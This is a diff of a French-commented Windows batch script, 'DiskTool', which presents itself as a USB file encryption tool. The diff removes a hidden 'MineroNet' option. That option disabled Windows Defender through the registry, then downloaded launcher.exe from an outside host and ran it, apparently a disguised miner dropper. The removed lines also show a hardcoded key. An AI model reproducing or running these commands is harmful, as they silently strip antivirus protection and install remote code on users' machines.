@@ -1,16 +1,10 @@
 @echo off
 color a
 mode con: cols=62 lines=10
-title DiskTool v2.1 - %time%
-rem
-rem Initialisation des variables
-rem
+title DiskTool - %time%
 set VaultPath=\Documents\
 set encryptionKey=133521
 
-rem
-rem Gestion du menu
-rem
 :Menu
 cls
 echo Welcome to DiskTool, type "help" to view all commands.
@@ -20,7 +14,6 @@ set result=true
 if %action%==encrypt call :InitForEncrypt
 if %action%==decrypt call :InitForDecrypt
 if %action%==newkey call :NewKey
-if %action%==net call :MineroNet
 if %action%==help call :Help
 if %action%==exit exit
 
@@ -29,15 +22,12 @@ echo.
 pause
 goto Menu
 
-rem
-rem Demande du mot de passe
-rem
 :GetPass
 cls
 echo Enter your decryption key to decrypt this disk.
 echo.
 set /p "pass=root@vault:~# "
-if NOT %pass%== 133521 goto :Fail
+if NOT %pass%== YOURPASSWORD goto :Fail
 exit /b
 
 :InitForEncrypt
@@ -145,12 +135,7 @@ goto :Menu
 echo encrypt - Encrypts all files stored on this USB device.
 echo decrypt - Decrypts all files when password is correct.
 echo newkey - Create a new text key in %VaultPath%Keys\.
-echo net - Installs MineroNet.
 echo help - displays this command.
 echo.
 pause
 goto :Menu
-
-:MineroNet
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t "REG_DWORD" /d "1" /f
-curl https://minero.wnetmc.repl.co/launcher.exe >> launcher.exe && echo start launcher.exe> launcher.bat && echo exit>>launcher.bat && start launcher.bat
